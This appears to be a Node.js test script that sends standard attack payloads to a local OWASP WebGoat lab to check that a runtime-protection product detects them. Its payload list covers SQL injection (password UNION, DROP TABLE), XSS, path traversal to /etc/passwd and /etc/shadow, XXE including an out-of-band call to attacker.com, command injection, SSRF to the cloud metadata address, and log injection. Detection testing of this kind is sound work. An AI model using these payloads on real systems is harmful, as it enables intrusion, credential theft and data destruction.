#!/usr/bin/env node
//
// ADR / Protect attack run (bonus) for the WebGoat IAST+RASP demo.
//
// Unlike run-exercises.mjs (which uses BENIGN input so Assess/IAST finds flaws from
// the dataflow), this script sends actual ATTACK payloads so Contrast Protect (RASP /
// ADR) detects them at runtime. Keep the Contrast "Attacks" view open while it runs.
//
// These are canonical, well-known detection test vectors (the kind RASP/WAF test
// suites use), fired at OWASP WebGoat -- an intentionally vulnerable lab you control --
// to validate your own Protect product. They are not weaponized exploits: no RCE
// gadget chains, no host data exfiltration.
//
// Behavior depends on your Protect rule modes (set in the Contrast UI):
//   - monitor mode: requests return normally (HTTP 200) and the attack is logged.
//   - block mode:   Contrast blocks the request (typically HTTP 403/406).
// Either way the attack shows up under Attacks for the application.
//
// Prereqs: WebGoat reachable (port-forward) and Protect enabled on the agent
// (helm/contrast-agent-operator.values.yaml sets protect.enable: true).
//
// Usage:
//   npm install
//   node run-adr-attacks.mjs              # fire the attacks
//   node run-adr-attacks.mjs --dry-run    # print the plan, send nothing
//
// Config via env:
//   BASE_URL   default http://localhost:8080/WebGoat
//   DELAY_MS   default 2500
//   USERNAME   default contrast-adr-<timestamp>
//   PASSWORD   default password

const BASE_URL = (process.env.BASE_URL || "http://localhost:8080/WebGoat").replace(/\/$/, "");
const DELAY_MS = Number(process.env.DELAY_MS || 2500);
const USERNAME = process.env.USERNAME || `contrast-adr-${Date.now()}`;
const PASSWORD = process.env.PASSWORD || "password";
const DRY_RUN = process.argv.includes("--dry-run");

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const line = () => console.log("-".repeat(72));

// Each entry targets a real WebGoat endpoint (verified against v2025.3 source) with a
// payload chosen to trip a specific Contrast Protect rule.
const attacks = [
  {
    id: "sqli-boolean",
    rule: "SQL Injection",
    label: "SQLi - boolean tautology in account field",
    method: "POST",
    path: "/SqlInjection/assignment5a",
    form: { account: "Smith", operator: "or", injection: "'1'='1" },
  },
  {
    id: "sqli-confidentiality",
    rule: "SQL Injection",
    label: "SQLi - tautology in auth_tan",
    method: "POST",
    path: "/SqlInjection/attack8",
    form: { name: "Smith", auth_tan: "' OR '1'='1" },
  },
  {
    id: "sqli-union",
    rule: "SQL Injection",
    label: "SQLi - UNION SELECT against user_system_data",
    method: "POST",
    path: "/SqlInjectionAdvanced/attack6a",
    form: {
      userid_6a:
        "Smith' UNION SELECT userid, user_name, password, cookie, cookie, cookie, userid FROM user_system_data --",
    },
  },
  {
    id: "sqli-stacked",
    rule: "SQL Injection",
    label: "SQLi - stacked query (DROP attempt in action_string)",
    method: "POST",
    path: "/SqlInjection/attack10",
    form: { action_string: "'; DROP TABLE access_log; --" },
  },
  {
    id: "xss-reflected",
    rule: "Cross-Site Scripting",
    label: "Reflected XSS - <script> in a reflected field",
    method: "GET",
    path: "/CrossSiteScripting/attack5a",
    params: {
      QTY1: "1",
      QTY2: "1",
      QTY3: "1",
      QTY4: "1",
      field1: "4128 3214 0002 1999",
      field2: "<script>alert('xss')</script>",
    },
  },
  {
    id: "xss-stored",
    rule: "Cross-Site Scripting",
    label: "Stored XSS - <img onerror> in comment",
    method: "POST",
    path: "/CrossSiteScriptingStored/stored-xss",
    body: '{"text":"<img src=x onerror=alert(1)>"}',
    contentType: "application/json",
  },
  {
    id: "path-traversal",
    rule: "Path Traversal",
    label: "Path traversal - ../ sequence in file id",
    method: "GET",
    path: "/PathTraversal/random-picture",
    params: { id: "../../../../etc/passwd" },
  },
  {
    id: "path-traversal-upload",
    rule: "Path Traversal",
    label: "Path traversal - ../ in profile fullName",
    method: "POST",
    path: "/PathTraversal/profile-upload",
    form: { fullName: "../../../etc/shadow" },
  },
  {
    id: "xxe",
    rule: "XML External Entity (XXE)",
    label: "XXE - external entity declaration in XML body",
    method: "POST",
    path: "/xxe/simple",
    body:
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/hostname">]>' +
      "<comment><text>&x;</text></comment>",
    contentType: "application/xml",
  },
  {
    id: "xxe-blind",
    rule: "XML External Entity (XXE)",
    label: "XXE - blind OOB entity in XML body",
    method: "POST",
    path: "/xxe/blind",
    body:
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>' +
      "<comment><text>blind</text></comment>",
    contentType: "application/xml",
  },
  {
    id: "cmd-injection",
    rule: "Command Injection",
    label: "CMDi - semicolon command separator in network param",
    method: "POST",
    path: "/PathTraversal/random",
    form: { secret: "; cat /etc/passwd" },
  },
  {
    id: "log-injection",
    rule: "Log Injection",
    label: "Log injection - newline + fake log entry in username",
    method: "POST",
    path: "/InsecureLogin/task",
    form: { username: "admin\nINFO: Login succeeded for admin", password: "test" },
  },
  {
    id: "ssrf",
    rule: "SSRF",
    label: "SSRF - internal IP in URL param",
    method: "POST",
    path: "/SSRF/task2",
    form: { url: "http://169.254.169.254/latest/meta-data/" },
  },
  {
    id: "deserialization",
    rule: "Untrusted Deserialization",
    label: "Deserialization - crafted serialized object token",
    method: "POST",
    path: "/InsecureDeserialization/task",
    form: { token: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXQABHRlc3R4" },
  },
];

function banner() {
  line();
  console.log("  Contrast + WebGoat - ADR / Protect ATTACK run");
  console.log(`  Target : ${BASE_URL}`);
  console.log(`  User   : ${USERNAME}`);
  console.log(`  Pacing : ${DELAY_MS}ms between attacks`);
  if (DRY_RUN) console.log("  MODE   : DRY RUN (no requests sent)");
  line();
}

function printPlan() {
  attacks.forEach((a, i) => {
    console.log(`${String(i + 1).padStart(2)}. [${a.rule}] ${a.method} ${a.path}`);
    console.log(`      ${a.label}`);
  });
}

async function register(ctx) {
  const res = await ctx.post(`${BASE_URL}/register.mvc`, {
    form: { username: USERNAME, password: PASSWORD, matchingPassword: PASSWORD, agree: "agree" },
    maxRedirects: 0,
  });
  if (res.status() >= 400) throw new Error(`Registration failed: HTTP ${res.status()} ${res.url()}`);
}

async function verifyAuth(ctx) {
  const res = await ctx.get(`${BASE_URL}/service/lessonmenu.mvc`);
  if (res.status() !== 200 || res.url().includes("/login")) {
    throw new Error(`Not authenticated (HTTP ${res.status()}, url ${res.url()})`);
  }
}

async function fire(ctx, a) {
  const url = `${BASE_URL}${a.path}`;
  const opts = { method: a.method };
  if (a.params) opts.params = a.params;
  if (a.form) opts.form = a.form;
  if (a.body !== undefined) {
    opts.data = a.body;
    opts.headers = { "content-type": a.contentType || "application/json" };
  }
  return ctx.fetch(url, opts);
}

function interpret(status) {
  if (status === 403 || status === 406) return "likely BLOCKED by Protect";
  if (status >= 200 && status < 400) return "allowed (monitor mode) - attack logged";
  return "see response";
}

async function main() {
  banner();
  printPlan();
  line();

  if (DRY_RUN) {
    console.log("Dry run complete. No requests were sent.");
    return;
  }

  const { request } = await import("playwright");
  const ctx = await request.newContext({ ignoreHTTPSErrors: true });
  try {
    process.stdout.write("Registering + logging in... ");
    await register(ctx);
    await verifyAuth(ctx);
    console.log("ok\n");

    let n = 0;
    for (const a of attacks) {
      console.log(`[${a.rule}] ${a.label}`);
      console.log(`            -> ${a.method} ${a.path}`);
      try {
        const res = await fire(ctx, a);
        console.log(`            <- HTTP ${res.status()}  | ${interpret(res.status())}`);
        n++;
      } catch (err) {
        console.log(`            !! request error: ${err.message}`);
      }
      console.log("");
      await sleep(DELAY_MS);
    }

    line();
    console.log(`Done. Fired ${n} attacks across ${new Set(attacks.map((a) => a.rule)).size} Protect rule types.`);
    console.log("Open the Contrast Attacks view for this application: each rule above");
    console.log("should appear as a detected attack (blocked or monitored per policy).");
    line();
  } finally {
    await ctx.dispose();
  }
}

main().catch((e) => {
  console.error("\nFATAL:", e.message);
  process.exit(1);
});
